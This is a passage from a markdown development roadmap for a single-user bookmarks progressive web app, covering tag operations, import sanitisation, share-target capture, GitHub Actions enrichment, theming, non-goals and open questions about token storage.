* [ ] **4f.** Bulk tag operations — rename, merge, delete across the whole collection.
  Renaming a subtree is a prefix replace over every matching tag string; re-normalise the
  result and merge into any tag it now collides with.
* [ ] **4h.** Map source folder paths to tag paths through the §3.3.3 normaliser, and show
  the collapse in the import preview — `Development`, `development`, and `Development `
  becoming one tag must be visible before the import is applied (§3.3.4).
* [ ] **4g.** Import sanitisation: `DOMParser` into a detached document, `textContent`
  only, control characters stripped, lengths capped. Fixture-tested against a hostile
  bookmarks file containing `javascript:` URLs and HTML payloads in titles (§5.4).

## 12. Phase 5 — Capture Surfaces

* [ ] **5a.** PWA manifest + service worker; installable, offline-capable. Manifest needs
  `name`, `short_name`, `start_url`, `display: standalone`, and 192/512 icons including a
  maskable variant.
* [ ] **5b.** Web Share Target so Android "Share -> Bookmarks" works from any app.
* [ ] **5f.** Share-target field normalisation. Android apps are inconsistent about which
  field carries the URL — many use `text`, some pack title and URL together into `text`,
  fewer use `url`. Read all three (`url`, `text`, `title`) and extract the first valid URL
  from whichever is populated. A handler reading only `params.url` silently receives empty
  shares from a large share of apps.
* [ ] **5c.** iOS path — Share Sheet does not support Web Share Target; ship a Shortcut and
  a bookmarklet instead.
* [ ] **5d.** Desktop bookmarklet: one click captures the current tab's URL and title.
* [ ] **5e.** Verify the share -> offline -> app-closed path end to end on Chrome Android,
  and the flush-on-open fallback on Firefox Android (§6.2).
* [ ] **5g.** Install flow: capture and stash `beforeinstallprompt`, re-surface the offer
  after the first saved bookmark rather than during setup, and render illustrated
  "Add to Home Screen" instructions on iOS where no programmatic trigger exists (§6.4).
* [ ] **5h.** On successful install, request storage persistence (3i) and re-evaluate the
  token storage mode against the §5.5 matrix.

## 13. Phase 6 — Automation (GitHub Actions)

Browsers cannot fetch arbitrary pages for metadata — CORS blocks it. Enrichment therefore
runs server-side in the repo itself, which costs nothing and needs no infrastructure.

* [ ] **6a.** On-commit Action: fetch `<title>`, meta description, and favicon for records
  where `enrichedAt` is null; commit the enrichment back.
* [ ] **6b.** Loop guard — the enrichment commit must not retrigger the workflow.
* [ ] **6c.** Weekly scheduled link checker; flag dead links for review in-app.
* [ ] **6d.** Optional archival: submit new URLs to the Wayback Machine.
* [ ] **6e.** Sanitise scraped metadata inside the Action — strip control characters, cap
  lengths — and re-validate on load. Our own workflow's output is not trusted (§5.4).

## 14. Phase 7 — UX Polish

* [ ] **7a.** Command palette (`Cmd/Ctrl-K`) — add, search, filter, jump, all keyboard.
* [ ] **7b.** Theme system: light, dark, and **e-ink** — the full §1.2 specification:
  pure black on white, no greys, no colour-only signalling, no animation, static loading
  text in place of spinners, no hover-only affordances, large hit targets.
* [ ] **7c.** Pagination with keyboard and tap navigation — **not** virtual scrolling.
  Under 500 bookmarks virtualisation buys nothing (§1.1), and pagination is additionally
  what e-ink wants in Phase 7.
* [ ] **7d.** Accessibility: full keyboard navigation, focus management, ARIA, reduced-motion.
* [ ] **7e.** Onboarding that states the git-history privacy caveat (§5.3) plainly.
* [ ] **7f.** Settings: token storage mode (§5.5, showing which mode is active and why),
  foreground refresh interval (3k; off / 1 / 5 / 15 min), tombstone retention, storage
  persistence state (§6.3), theme.

---

## 15. Non-Goals

Recorded so scope stays honest:

* **No multi-user or sharing.** Single-user, multi-device is the target.
* **No full-text page archiving.** Bookmarks are pointers, not copies.
* **No browser extension** before Phase 7 — the bookmarklet and PWA cover capture.
* **No server component, ever.** If a feature needs one, it belongs in a GitHub Action.
* **No performance engineering for scale we do not have.** Virtualisation, sharding, and
  the Git Data API are all out until 3g says otherwise (§1.1).
* **No background polling and no push notifications.** The app syncs when opened and
  flushes queued writes on reconnect — nothing more (§6).

---

## 16. Open Questions

1. **D13 — PIN-wrapped token storage?** With D10 resolved as "no custom domain", the honest
   default (D8) makes mobile users re-paste a 93-character PAT after every cold launch.
   Wrapping the token with a short PIN via WebCrypto (PBKDF2 -> AES-GCM) would reduce that to
   typing a PIN, while leaving a sibling page on the shared origin holding ciphertext it
   cannot open. It does **not** defend against XSS inside this app after unlock — nothing
   client-side does. Needs sign-off before 1b.
2. **D11 — encryption at rest?** Still defaulted off. Turning it on forfeits readable diffs
   and all Phase 6 automation. Note this is a *different* question from D13: D13 protects the
   token, D11 protects the bookmarks.
3. **Hosting account.** With D10 settled, a **dedicated GitHub account** for the app repo is
   the remaining cheap mitigation for §5.1 — it empties the shared origin of anything else
   that could be attacked. Costs nothing but a second login.
4. **Repo layout.** Assumed: public app repo (Pages on a private repo requires a paid plan,
   and the app ships no secrets) plus a separate private data repo. Confirm.
